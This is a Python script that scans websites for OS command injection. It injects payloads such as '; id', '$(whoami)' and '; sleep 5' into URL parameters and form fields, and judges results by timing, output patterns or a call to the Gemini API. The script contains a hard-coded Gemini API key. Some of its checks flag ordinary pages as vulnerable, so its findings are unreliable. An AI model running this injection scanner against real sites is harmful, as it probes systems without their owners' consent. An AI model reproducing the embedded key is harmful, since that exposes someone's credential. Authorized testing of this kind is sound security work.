import os
import requests
import urllib.parse
import json
import time
import random
import string
import re
from concurrent.futures import ThreadPoolExecutor

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# Command Injection payloads to test
CMDI_PAYLOADS = [
    # Windows payloads
    "& whoami",
    "| whoami",
    "; whoami",
    "&&whoami",
    "||whoami",
    "`whoami`",
    "$(whoami)",
    "; ping -n 3 127.0.0.1",
    "& ping -n 3 127.0.0.1",
    "| ping -n 3 127.0.0.1",
    "& timeout 3",
    "| timeout 3",
    "; timeout 3",
    # Linux payloads
    "& id",
    "| id",
    "; id",
    "&& id",
    "|| id",
    "`id`",
    "$(id)",
    "; sleep 3",
    "& sleep 3",
    "| sleep 3",
    # Special characters
    "test'$(whoami)'",
    "test\"$(whoami)\"",
    "test`whoami`",
    # Blind payloads
    "& ping -n 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
    "; ping -n 5 127.0.0.1",
    "& sleep 5",
    "| sleep 5",
    "; sleep 5",
]

# Patterns to detect successful command injection
CMDI_PATTERNS = [
    # Windows username patterns
    "Administrator",
    "SYSTEM",
    "NT AUTHORITY",
    # Windows command output patterns
    "Reply from 127.0.0.1",
    "bytes=32",
    "TTL=",
    # Linux command output patterns
    "uid=",
    "gid=",
    "groups=",
    # General command output patterns
    "Directory of",
    "Volume in drive",
    "Volume Serial Number",
    "File Not Found",
    "Permission denied",
    "command not found",
    "is not recognized as",
    "internal or external command",
    "sh:",
    "bash:",
    "/bin/",
    "/usr/bin/",
    "/etc/",
    "/var/",
    "/home/",
]

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

def generate_random_string(length=8):
    """Generate a random string for testing."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_with_params(file_path):
    """Extract URLs with parameters from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url and '?' in url:  # Make sure URL is not empty and has parameters
                    urls.append(url)
    except Exception as e:
        print(f"Error reading file: {e}")
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    return urls

def check_for_cmdi_patterns(response_text):
    """Check if the response contains patterns indicating successful command injection."""
    for pattern in CMDI_PATTERNS:
        if pattern in response_text:
            return True, pattern
    return False, None

def analyze_with_gemini(url, payload, response_content, original_content):
    """
    Use Gemini API to analyze if the Command Injection payload is likely to be successful.
    """
    # First, check for common command output patterns
    has_pattern, pattern = check_for_cmdi_patterns(response_content)
    if has_pattern:
        return True, f"VULNERABLE: Command output pattern detected: {pattern}"
    
    # Check for significant differences in response
    if len(response_content) != len(original_content) and abs(len(response_content) - len(original_content)) > 100:
        return True, f"VULNERABLE: Significant difference in response length ({len(response_content)} vs {len(original_content)})"
    
    # Use Gemini for more advanced analysis
    prompt = f"""
    I need to analyze if this OS Command Injection payload is likely to be successful based on the following response.
    
    URL: {url}
    Payload: {payload}
    
    Original Response Length: {len(original_content)}
    Modified Response Length: {len(response_content)}
    
    Modified Response (truncated if necessary):
    {response_content[:4000]}
    
    Please analyze if:
    1. There are any signs of successful command execution (e.g., command output, system information)
    2. There are any error messages that might indicate a partial success
    3. The response structure has changed significantly compared to a normal response
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return False, "Error analyzing response with Gemini"
    except Exception as e:
        return False, f"Error calling Gemini API: {str(e)}"

def test_url_for_cmdi(url):
    """Test a URL for Command Injection vulnerabilities."""
    print(f"Testing URL: {url}")
    results = []
    
    try:
        # Parse the URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # If no parameters in URL, try to find form fields
        if not query_params:
            try:
                print(f"No query parameters found, checking for forms in {url}")
                response = requests.get(url, headers=HEADERS, timeout=10)
                
                # Simple form field extraction
                form_fields = []
                if '<form' in response.text.lower():
                    # Extract input fields from forms
                    input_pattern = r'<input.*?name=["\']([^"\']+)["\']'
                    form_fields = re.findall(input_pattern, response.text, re.IGNORECASE)
                    
                    if form_fields:
                        print(f"Found {len(form_fields)} form fields: {', '.join(form_fields)}")
                        
                        # Test each form field with Command Injection payloads
                        for field in form_fields:
                            # First get a baseline response
                            normal_value = generate_random_string()
                            test_data = {field: normal_value}
                            
                            try:
                                normal_response = requests.post(url, data=test_data, headers=HEADERS, timeout=10)
                                normal_content = normal_response.text
                                
                                # Test Command Injection payloads
                                for payload in CMDI_PAYLOADS:
                                    cmdi_data = {field: payload}
                                    
                                    try:
                                        # Use a longer timeout for time-based payloads
                                        timeout = 15 if ('sleep' in payload or 'ping' in payload or 'timeout' in payload) else 10
                                        start_time = time.time()
                                        cmdi_response = requests.post(url, data=cmdi_data, headers=HEADERS, timeout=timeout)
                                        elapsed_time = time.time() - start_time
                                        
                                        # Check for time-based payloads
                                        if ('sleep 5' in payload or 'ping -n 5' in payload) and elapsed_time > 5:
                                            print(f"Potential time-based Command Injection found in form field {field} with payload {payload}")
                                            results.append({
                                                'url': url,
                                                'param': f"form:{field}",
                                                'payload': payload,
                                                'status': 'Potential Time-based Command Injection (Form)',
                                                'analysis': f"Response time: {elapsed_time:.2f} seconds"
                                            })
                                            break
                                        
                                        # Check for command output patterns
                                        has_pattern, pattern = check_for_cmdi_patterns(cmdi_response.text)
                                        
                                        if has_pattern:
                                            print(f"Potential Command Injection found in form field {field} with payload {payload}")
                                            results.append({
                                                'url': url,
                                                'param': f"form:{field}",
                                                'payload': payload,
                                                'status': 'Potential Command Injection Vulnerability (Form)',
                                                'analysis': f"Command output pattern detected: {pattern}"
                                            })
                                            break
                                        
                                        # If no obvious pattern, use Gemini for analysis
                                        is_vulnerable, explanation = analyze_with_gemini(url, payload, cmdi_response.text, normal_content)
                                        
                                        if is_vulnerable:
                                            results.append({
                                                'url': url,
                                                'param': f"form:{field}",
                                                'payload': payload,
                                                'status': 'Potential Command Injection Vulnerability (Form)',
                                                'analysis': explanation
                                            })
                                            break
                                    except requests.Timeout:
                                        # If we get a timeout on a sleep/ping payload, it might be vulnerable
                                        if 'sleep' in payload or 'ping' in payload or 'timeout' in payload:
                                            print(f"Potential time-based Command Injection found in form field {field} (request timed out)")
                                            results.append({
                                                'url': url,
                                                'param': f"form:{field}",
                                                'payload': payload,
                                                'status': 'Potential Time-based Command Injection (Form)',
                                                'analysis': "Request timed out, which might indicate a successful time-based injection"
                                            })
                                            break
                                    except Exception as e:
                                        print(f"Error testing Command Injection payload: {e}")
                                        continue
                            except Exception as e:
                                print(f"Error testing form field {field}: {e}")
                                continue
            except Exception as e:
                print(f"Error checking for forms: {e}")
            
            return results
        
        # Test each parameter individually
        for param, values in query_params.items():
            print(f"Testing parameter: {param}")
            
            # Get a baseline response with a normal value
            normal_value = generate_random_string()
            test_params = {p: values[0] for p, values in query_params.items()}
            test_params[param] = normal_value
            test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            try:
                normal_response = requests.get(test_url, headers=HEADERS, timeout=10)
                normal_content = normal_response.text
                
                # Test Command Injection payloads
                for payload in CMDI_PAYLOADS:
                    cmdi_params = {p: values[0] for p, values in query_params.items()}
                    cmdi_params[param] = payload
                    cmdi_url = f"{base_url}?{urllib.parse.urlencode(cmdi_params, doseq=True)}"
                    
                    try:
                        # Use a longer timeout for time-based payloads
                        timeout = 15 if ('sleep' in payload or 'ping' in payload or 'timeout' in payload) else 10
                        start_time = time.time()
                        cmdi_response = requests.get(cmdi_url, headers=HEADERS, timeout=timeout)
                        elapsed_time = time.time() - start_time
                        
                        # Check for time-based payloads
                        if ('sleep 5' in payload or 'ping -n 5' in payload) and elapsed_time > 5:
                            print(f"Potential time-based Command Injection found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential Time-based Command Injection',
                                'analysis': f"Response time: {elapsed_time:.2f} seconds"
                            })
                            break
                        
                        # Check for command output patterns
                        has_pattern, pattern = check_for_cmdi_patterns(cmdi_response.text)
                        
                        if has_pattern:
                            print(f"Potential Command Injection found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential Command Injection Vulnerability',
                                'analysis': f"Command output pattern detected: {pattern}"
                            })
                            break
                        
                        # Use Gemini for more advanced analysis
                        is_vulnerable, explanation = analyze_with_gemini(cmdi_url, payload, cmdi_response.text, normal_content)
                        
                        if is_vulnerable:
                            print(f"Potential Command Injection found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential Command Injection Vulnerability',
                                'analysis': explanation
                            })
                            break
                    except requests.Timeout:
                        # If we get a timeout on a sleep/ping payload, it might be vulnerable
                        if 'sleep' in payload or 'ping' in payload or 'timeout' in payload:
                            print(f"Potential time-based Command Injection found in parameter {param} (request timed out)")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential Time-based Command Injection',
                                'analysis': "Request timed out, which might indicate a successful time-based injection"
                            })
                            break
                    except Exception as e:
                        print(f"Error testing Command Injection payload: {e}")
                        continue
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")
        
    except Exception as e:
        print(f"Error processing URL {url}: {e}")
    
    return results

def scan_cmdi(params_file_path, max_workers=3):
    """
    Scan URLs with parameters for Command Injection vulnerabilities.
    
    Args:
        params_file_path: Path to the file containing URLs with parameters
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential Command Injection vulnerabilities
    """
    if not os.path.exists(params_file_path):
        print(f"File not found: {params_file_path}")
        return []
    
    urls = extract_urls_with_params(params_file_path)
    if not urls:
        print("No URLs with parameters found in the file.")
        return []
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        print(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_cmdi, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            print(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(params_file_path)
    domain = os.path.basename(params_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_cmdi_results.txt")
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("Command Injection Vulnerability Scan Results\n")
            f.write("=======================================\n\n")
            
            for result in all_results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['param']}\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No Command Injection vulnerabilities found.\n")
    
    return all_results

def test_specific_parameter(param_name, target_url=None):
    """Test a specific parameter for Command Injection vulnerabilities."""
    if not target_url:
        target_url = "http://testphp.vulnweb.com/search.php"
    
    url = f"{target_url}?{param_name}=test"
    print(f"Testing parameter '{param_name}' on URL: {url}")
    
    results = []
    
    try:
        # Get a baseline response
        normal_response = requests.get(url, headers=HEADERS, timeout=10)
        normal_content = normal_response.text
        
        # Test Command Injection payloads
        for payload in CMDI_PAYLOADS:
            cmdi_url = f"{target_url}?{param_name}={urllib.parse.quote(payload)}"
            
            try:
                # Use a longer timeout for time-based payloads
                timeout = 15 if ('sleep' in payload or 'ping' in payload or 'timeout' in payload) else 10
                start_time = time.time()
                cmdi_response = requests.get(cmdi_url, headers=HEADERS, timeout=timeout)
                elapsed_time = time.time() - start_time
                
                # Check for time-based payloads
                if ('sleep 5' in payload or 'ping -n 5' in payload) and elapsed_time > 5:
                    print(f"Potential time-based Command Injection found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential Time-based Command Injection',
                        'analysis': f"Response time: {elapsed_time:.2f} seconds"
                    })
                    break
                
                # Check for command output patterns
                has_pattern, pattern = check_for_cmdi_patterns(cmdi_response.text)
                
                if has_pattern:
                    print(f"Potential Command Injection found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential Command Injection Vulnerability',
                        'analysis': f"Command output pattern detected: {pattern}"
                    })
                    break
                
                # If no obvious pattern, use Gemini for analysis
                is_vulnerable, explanation = analyze_with_gemini(cmdi_url, payload, cmdi_response.text, normal_content)
                
                if is_vulnerable:
                    print(f"Potential Command Injection found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential Command Injection Vulnerability',
                        'analysis': explanation
                    })
                    break
            except requests.Timeout:
                # If we get a timeout on a sleep/ping payload, it might be vulnerable
                if 'sleep' in payload or 'ping' in payload or 'timeout' in payload:
                    print(f"Potential time-based Command Injection found (request timed out)")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential Time-based Command Injection',
                        'analysis': "Request timed out, which might indicate a successful time-based injection"
                    })
                    break
            except Exception as e:
                print(f"Error testing Command Injection payload: {e}")
    
    except Exception as e:
        print(f"Error testing parameter: {e}")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct parameter test
        if '=' in file_path and not os.path.exists(file_path):
            param_name = file_path.split('=')[0]
            target_url = None
            if len(sys.argv) > 2:
                target_url = sys.argv[2]
            
            results = test_specific_parameter(param_name, target_url)
            
            if results:
                print(f"\nFound {len(results)} potential Command Injection vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo Command Injection vulnerabilities found.")
        else:
            print(f"Scanning file: {file_path}")
            results = scan_cmdi(file_path)
            
            if results:
                print(f"\nFound {len(results)} potential Command Injection vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo Command Injection vulnerabilities found.")
    else:
        print("Usage: python cmdi_test.py <path_to_params_file_or_parameter>")
        print("Examples:")
        print("  python cmdi_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_params.txt")
        print("  python cmdi_test.py cmd=dir http://example.com/command.php")